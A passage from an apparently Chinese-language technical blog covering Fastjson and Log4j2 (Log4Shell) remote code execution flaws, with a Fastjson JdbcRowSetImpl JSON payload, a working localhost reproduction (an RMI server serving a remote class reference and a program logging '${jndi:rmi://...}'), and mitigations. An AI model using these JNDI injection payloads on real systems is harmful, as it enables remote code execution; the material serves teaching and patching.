</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;        \&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;        \&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/hello\&#34;,&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;        \&#34;autoCommit\&#34;:true&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;    }&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>JSON</span><span style=color:#000>.</span><span style=color:#836c28>parse</span><span style=color:#000>(</span><span style=color:#000>payload</span><span style=color:#000>);</span>
</span></span></code></pre></td></tr></table></div></div></div><h3 id=原理分析-5>原理分析</h3><p>待补充</p><h1 id=reference>Reference</h1><p><a href=https://www.freebuf.com/vuls/178012.html>Fastjson 1.2.24反序列化漏洞分析</a></p><p><a href=https://www.freebuf.com/vuls/208339.html>浅谈Fastjson RCE漏洞的绕过史</a></p><p><a href=https://github.com/shengqi158/fastjson-remote-code-execute-poc>github fastjson远程执行poc</a></p><p><a href=http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90>fastjson 远程反序列化poc的构造和分析</a></p><p><a href=http://xxlegend.com/2018/10/23/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90>基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析</a></p><p><a href=https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA>如何绕过高版本JDK限制进行JNDI注入利用</a></p><p><a href=https://www.donews.com/news/detail/4/3086961.html>Fastjson 1.2.67版本刚刚发布即爆出严重漏洞</a></p><p><a href=https://www.cnblogs.com/binarylei/p/12273010.html>Spring IOC前世今生之JDNI</a></p><p><a href=https://www.anquanke.com/post/id/233629>JDNI注入学习</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-ea185f40244b6a031af62755d50175fa>2 - Log4j2远程执行漏洞</h1><h1 id=背景>背景</h1><p>都2021年了，居然还有这种简单粗暴直接替换占位符的安全问题，真的难以想象。比之前fastjson的漏洞还要大、还要容易。</p><h1 id=问题原因>问题原因</h1><h2 id=占位符替换机制>占位符替换机制</h2><p>log4j提供了占位符的功能，如下：</p><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#000>logger</span><span style=color:#000>.</span><span style=color:#836c28>info</span><span style=color:#000>(</span><span style=color:#c41a16>&#34;os: ${java:os}&#34;</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span><span style=color:#177500>// 会输出操作系统的信息
</span></span></span></code></pre></td></tr></table></div></div></div><p>会把 ${java:os} 替换成了 System.getProperties("os")</p><h2 id=jndi占位符替换>jndi占位符替换</h2><p>离谱的是 log4j 还提供了关于 jndi 的占位符。如：</p><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#000>logger</span><span style=color:#000>.</span><span style=color:#836c28>info</span><span style=color:#000>(</span><span style=color:#c41a16>&#34;${jndi:rmi://127.0.0.1:1099/hello}&#34;</span><span style=color:#000>)</span>
</span></span></code></pre></td></tr></table></div></div></div><h1 id=影响范围>影响范围</h1><p>1、log4j 2.x.x版本（包括直接、间接依赖；1.x版本不受影响）</p><p>2、FastJson &lt; 1.2.69 版本</p><h1 id=漏洞复现>漏洞复现</h1><p>更多源码参考：<a href=https://github.com/chnherb/java-demo/tree/master/src/main/java/com/huangbo/log/logsafe>java-demo logsafe</a></p><h2 id=jndi服务>jndi服务</h2><style>.highlight{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:130%}.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}</style><details class=code-collapse><summary>Expand/Collapse Code Block</summary><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a90d91>package</span> <span style=color:#000>com.huangbo.log.logsafe</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>com.sun.jndi.rmi.registry.ReferenceWrapper</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>javax.naming.NamingException</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>javax.naming.Reference</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>javax.swing.*</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.AlreadyBoundException</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.RemoteException</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.registry.LocateRegistry</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.registry.Registry</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>public</span> <span style=color:#a90d91>class</span> <span style=color:#3f6e75>RmiSafeServer</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a90d91>public</span> <span style=color:#a90d91>static</span> <span style=color:#a90d91>void</span> <span style=color:#000>main</span><span style=color:#000>(</span><span style=color:#000>String</span><span style=color:#000>[]</span> <span style=color:#000>args</span><span style=color:#000>)</span> <span style=color:#a90d91>throws</span> <span style=color:#000>RemoteException</span><span style=color:#000>,</span> <span style=color:#000>NamingException</span><span style=color:#000>,</span> <span style=color:#000>AlreadyBoundException</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>LocateRegistry</span><span style=color:#000>.</span><span style=color:#836c28>createRegistry</span><span style=color:#000>(</span><span style=color:#000>1099</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>        <span style=color:#000>Registry</span> <span style=color:#000>registry</span> <span style=color:#000>=</span> <span style=color:#000>LocateRegistry</span><span style=color:#000>.</span><span style=color:#836c28>getRegistry</span><span style=color:#000>();</span>
</span></span><span style=display:flex><span>        <span style=color:#000>Reference</span> <span style=color:#000>reference</span> <span style=color:#000>=</span> <span style=color:#a90d91>new</span> <span style=color:#000>Reference</span><span style=color:#000>(</span><span style=color:#c41a16>&#34;com.huangbo.log.logsafe.Hello&#34;</span><span style=color:#000>,</span> <span style=color:#c41a16>&#34;com.huangbo.log.logsafe.Hello&#34;</span><span style=color:#000>,</span> <span style=color:#c41a16>&#34;http://127.0.0.1:1099/&#34;</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>        <span style=color:#000>ReferenceWrapper</span> <span style=color:#000>refObjWrapper</span> <span style=color:#000>=</span> <span style=color:#a90d91>new</span> <span style=color:#000>ReferenceWrapper</span><span style=color:#000>(</span><span style=color:#000>reference</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>        <span style=color:#000>registry</span><span style=color:#000>.</span><span style=color:#836c28>bind</span><span style=color:#000>(</span><span style=color:#c41a16>&#34;hello&#34;</span><span style=color:#000>,</span> <span style=color:#000>refObjWrapper</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000>}</span>
</span></span><span style=display:flex><span><span style=color:#000>}</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>class</span> <span style=color:#3f6e75>Hello</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a90d91>static</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>JOptionPane</span><span style=color:#000>.</span><span style=color:#836c28>showConfirmDialog</span><span style=color:#000>(</span><span style=color:#a90d91>null</span><span style=color:#000>,</span> <span style=color:#c41a16>&#34;嘿嘿嘿！！&#34;</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000>}</span>
</span></span><span style=display:flex><span><span style=color:#000>}</span>
</span></span></code></pre></td></tr></table></div></div></details><br><h2 id=用户程序>用户程序</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a90d91>package</span> <span style=color:#000>com.huangbo.log.logsafe</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>lombok.extern.slf4j.Slf4j</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>@Slf4j</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>public</span> <span style=color:#a90d91>class</span> <span style=color:#3f6e75>LogSafeDemo</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a90d91>public</span> <span style=color:#a90d91>static</span> <span style=color:#a90d91>void</span> <span style=color:#000>main</span><span style=color:#000>(</span><span style=color:#000>String</span><span style=color:#000>[]</span> <span style=color:#000>args</span><span style=color:#000>)</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span><span style=color:#177500>//        String name = &#34;${java:os}&#34;;
</span></span></span><span style=display:flex><span><span style=color:#177500></span>        <span style=color:#000>String</span> <span style=color:#000>name</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;${jndi:rmi://localhost:1099/hello}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span>        <span style=color:#000>login</span><span style=color:#000>(</span><span style=color:#000>name</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000>}</span>
</span></span><span style=display:flex><span>    <span style=color:#a90d91>public</span> <span style=color:#a90d91>static</span> <span style=color:#a90d91>void</span> <span style=color:#000>login</span><span style=color:#000>(</span><span style=color:#000>String</span> <span style=color:#000>name</span><span style=color:#000>){</span>
</span></span><span style=display:flex><span>        <span style=color:#000>log</span><span style=color:#000>.</span><span style=color:#836c28>info</span><span style=color:#000>(</span><span style=color:#000>name</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000>}</span>
</span></span><span style=display:flex><span><span style=color:#000>}</span>
</span></span></code></pre></td></tr></table></div></div></div><h2 id=触发用户程序>触发用户程序</h2><p>注意：务必关闭服务端和客户端的全局代理模式！</p><p>启动用户程序发现报错：</p><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-xml data-lang=xml><span style=display:flex><span>2021-12-18 17:51:05,537 main WARN Error looking up JNDI resource [rmi://localhost:1099/hello]. 
</span></span><span style=display:flex><span>javax.naming.ConfigurationException: The object factory is untrusted. 
</span></span><span style=display:flex><span>Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.
</span></span></code></pre></td></tr></table></div></div></div><p>因为本机用的是JDK8，添加了一个新的属性默认为false，需要在用户侧手动开启。添加如下参数，IDEA中配置"VM Options"<style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span>-Dcom.sun.jndi.rmi.object.trustURLCodebase<span style=color:#000>=</span><span style=color:#a90d91>true</span>
</span></span></code></pre></td></tr></table></div></div></div></p><p>重新启动，发现成功入侵！</p><h1 id=解决方法>解决方法</h1><h2 id=更新log4j版本>更新log4j版本</h2><p>将 log4j 到最新版本 2.15 及以上 ，亲测有效</p><h2 id=添加jvm参数>添加jvm参数</h2><p>亲测不行！</p><p>添加jvm参数，禁止占位符替换</p><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#000>-Dlog</span><span style=color:#1c01ce>4</span><span style=color:#000>j</span><span style=color:#1c01ce>2</span><span style=color:#000>.FORMATMsgNoLookups=</span><span style=color:#a90d91>true</span> 
</span></span></code></pre></td></tr></table></div></div></div><p>或创建 "log4j2.component.properties" 文件，文件中加入"log4j2.formatMsgNoLookups=true"</p><h2 id=升级到java8>升级到java8</h2><p>Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false，在使用 jndi 时会抛出一个报错阻止加载远程服务器提供的代码。</p><h2 id=删除jar包class文件>删除jar包class文件</h2><p>删除 log4j-core-*.jar 中 org/apache/logging/log4j/core/lookup/JndiLookup.class 这个文件，彻底进行不了 jndi</p><blockquote><p>可行性较小</p></blockquote><h1 id=reference>Reference</h1><p><a href=https://mp.weixin.qq.com/s/Yq9k1eBquz3mM1sCinneiA>Log4j 爆“核弹级”漏洞</a></p><p><a href=https://www.bilibili.com/read/cv14380391>Log4j 惊天远控漏洞: 原理？如何解决？</a></p></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2023 The Herb 保留所有权利</small>
<small class=ml-1><a href=# target=_blank rel=noopener>隐私政策</a></small><p class=mt-2><a href=/about/>Herbdocs</a></p></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js integrity="sha512-UR25UO94eTnCVwjbXozyeVd6ZqpaAE9naiEUBK/A+QDbfSTQFhPGj5lOR6d8tsgbBk84Ggb5A3EkjsOgPRPcKA==" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script>
<script src=/js/main.min.91798a335c881f1b6b805085ba4aa22d1dbd2b0b18d105d05189fa104ddae350.js integrity="sha256-kXmKM1yIHxtrgFCFukqiLR29KwsY0QXQUYn6EE3a41A=" crossorigin=anonymous></script></body></html>